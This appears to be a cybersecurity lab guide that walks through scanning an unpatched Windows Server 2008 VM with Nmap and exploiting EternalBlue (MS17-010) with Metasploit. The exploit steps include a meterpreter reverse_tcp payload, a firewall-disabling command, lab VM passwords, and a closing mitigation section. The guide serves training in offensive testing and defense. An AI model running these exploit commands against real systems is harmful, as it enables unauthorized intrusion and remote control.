
# Lab: Identifying, Analyzing, and Exploiting a Vulnerability on a Windows System

## Objective

In this lab, we will use Kali Linux to identify, analyze, and exploit a vulnerability on a Windows system. We will also discuss the attack vector, the vulnerability, the exploit, and how to mitigate the attack.

---

## Prerequisites

- Kali Linux VM
- One of the following Windows operating **Unpatched** systems:
  - Windows XP
  - Windows Vista
  - Windows 7
  - Windows 8.1
  - Windows 10 (older versions)
  - Windows Server 2003
  - Windows Server 2008
  - Windows Server 2012
  - Windows Server 2016
- Basic understanding of networking and cybersecurity concepts

---

## Lab Setup

### Materials Needed

- Kali Linux VM
- Windows 2008 VM
- Network connectivity between Kali Linux and Windows VMs

### Duration

45-60 minutes

---

## Instructions

### üïê Step 1: Setting Up the Environment

**Steps:**

1.1 Install Kali Linux on your VM and ensure it is updated to the latest version.  
1.2 Install a Windows Server 2008 VM. Ensure the Windows VM is connected to the same network as the Kali Linux VM.

  >**_NOTE:_** Existing vms: <br/>
       Kali - userid: Kali, pwd: **kali** <br/>
       SMB-Attack-2016 - userid: Learner Admin, pwd: **!xW.M5Z2rjn?/d~4K999** <br/>
       Win2008 - userid: Learner Admin, pwd: **!xW.M5Z2rjn?/d~4K999** <br/>
       Make sure both servers are on the same network and can communicate with each other.
       Ensure that the Windows VM has the necessary services running (e.g., SMB, RDP) and is not fully patched to allow for exploitation.
       It's recommened to take both VMs off of the internet to avoid any accidental updates or patches that could interfere with the lab.

1.3 Start VMs and ensure they are running. <br/>
1.4 Determine the IP addresses of both VMs. You can use the following commands:  
```bash
ifconfig # On Kali Linux
ipconfig # On Windows
```

![Kali ifconfig](image-1.png)

![Windows Server 2008 ipconfig](image-14.png)

![Windows Server 2016 ipconfig](image.png)

1.5 Ensure that the Windows firewall is disabled or configured to allow incoming connections on the ports you will be testing (e.g., port 445 for SMB).  
```bash
netsh advfirewall set allprofiles state off # Disable Windows Firewall - Run as Administrator
```

![Windows Server 2016 Disable Windows Firewall](image-2.png)


1.6 Verify network connectivity between the Kali Linux and Windows VMs.  
```bash
ping <Windows_IP> -c 3 # From Kali Linux
```


![Kali pinging Windows Server 2008](image-3.png)

---


### üîç Step 2: Reconnaissance - Discovery - Identifying the Vulnerability

**Objective:** Use Kali Linux to scan the Windows system for open ports and services, identifying potential vulnerabilities.

**Steps:**

2.1 Scan the Windows system using Nmap.  
```bash
sudo nmap -sS -sV -O <Windows_IP>
```
This command performs a SYN scan, service version detection, and OS detection.  

2.2 Analyze the scan results. Look for open ports and services that may be vulnerable.  
For example, if port 445 (SMB) is open, it might be vulnerable to the EternalBlue exploit.

![Nmap results](image-4.png)


2.3 Alternatively, there are a number of nmap scripts that can explicitly find vulnerabilities associated with the open ports.
```bash
nmap --script smb-vuln-ms17-010 -v <Windows_IP>
```

![Vulnerable Results on Windows 2008 server](image-13.png)

---

### üß† Step 3: Exploiting the Vulnerability

**Objective:** Exploit the identified vulnerability using Metasploit.

**Steps:**

3.1 Launch Metasploit on Kali Linux.  
```bash
msfconsole
```

![Metasploit Console](image-5.png)


3.2 Search for an exploit related to the vulnerability.  
```bash
search eternalblue
```

![Eternalblue Search Results](image-8.png)

3.3 Select the appropriate exploit.  
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

![Eternalblue Command](image-9.png)

![Result](image-10.png)

  >**_NOTE:_** The EternalBlue exploit is a well-known vulnerability in the SMB protocol that was used in the WannaCry ransomware attack. It allows remote code execution on vulnerable Windows systems. To run the exploit there are many options. Type in **options** to see the options available. The most important ones are **RHOST** (the target IP address) and **LHOST** (the attacker's IP address). You can also set the payload to be used with the exploit. In this case, we will use **windows/x64/meterpreter/reverse_tcp** as the payload.

3.5 Look at the options available for the exploit.  
```bash
show options
``` 

![Eternalblue Metasploit Options](image-15.png)

3.4 Configure the exploit with the target IP and payload options.  
```bash
set RHOST <Windows_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

![Configuring Eternalblue exploit](image-11.png)

3.5 Execute the exploit.  
```bash
exploit
```
![Success](image-16.png)

 >**_NOTE:_** If the exploit is successful, you will see a Meterpreter session opened. This indicates that you have successfully exploited the vulnerability and gained access to the target system. The Win2008 server is now compromised. The first time you run the exploit, it may take a few minutes to run and it may even crash the Windows 2008 server. Restart the Windows 2008 server and try again.

---

### üõ°Ô∏è Step 4: Analyzing the Exploit

**Objective:** Analyze the exploit result and understand the attack vector.

**Steps:**

4.1 Once the exploit is successful, a Meterpreter session will be opened.  
4.2 Use Meterpreter commands to gather information from the compromised system.  
```bash
sysinfo
getuid
```

![Running commands on compromised server](image-17.png)

4.3 Identify the attack vector used. 

In this case, the attack vector is the SMB service on port 445, exploited via the **EternalBlue** vulnerability.

---

### ‚öîÔ∏è Step 5: Mitigating the Attack

**Objective:** Implement strategies to mitigate the vulnerability.

**Steps:**

5.1 Patch the vulnerability by updating the Windows system with the latest security patches. Specifically, apply the patch for MS17-010.  
5.2 Configure the firewall to block unnecessary ports, including port 445, to prevent external access.  
5.3 Segment the network to restrict access to critical systems and limit the spread of malware.  
5.4 Deploy an Intrusion Detection System (IDS) to monitor network traffic for suspicious activity and potential exploits.  
5.5 Perform regular security audits and vulnerability assessments to identify and patch weaknesses.

---

## Summary

- **Attack Vector:** The method used by attackers to exploit the system (e.g., SMB service on port 445).
- **Vulnerability:** The weakness that allows the exploit to succeed (e.g., EternalBlue vulnerability in SMB).
- **Exploit:** The tool or technique used to exploit the vulnerability (e.g., Metasploit's EternalBlue exploit).
- **Mitigation:** Steps taken to reduce the impact or likelihood of future attacks (e.g., patching, firewall configuration, network segmentation).


### References
- [Microsoft Security BUlletin MS17-010-Critical](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Nmap Documentation](https://nmap.org/book/)
- [EternalBlue Exploit](https://www.cvedetails.com/cve/CVE-2017-0144/)
- [Microsoft Security Update Guide](https://msrc.microsoft.com/update-guide/en-US)
- [OWASP Top Ten Vulnerabilities](https://owasp.org/www-project-top-ten/)
- [CVE Details](https://www.cvedetails.com/)
- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Windows Security Updates](https://support.microsoft.com/en-us/windows/windows-security-updates-0f3b2c4a-5d7e-4a8b-8c1f-9d6e5f3c2a1e)
- [Cybersecurity and Infrastructure Security Agency (CISA)](https://www.cisa.gov/)
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [Common Vulnerabilities and Exposures (CVE)](https://cve.mitre.org/)
- [Exploit Database](https://www.exploit-db.com/)
- [SecurityFocus](https://www.securityfocus.com/)
- [SANS Internet Storm Center](https://isc.sans.edu/)
- [Kali Linux Forums](https://forums.kali.org/)
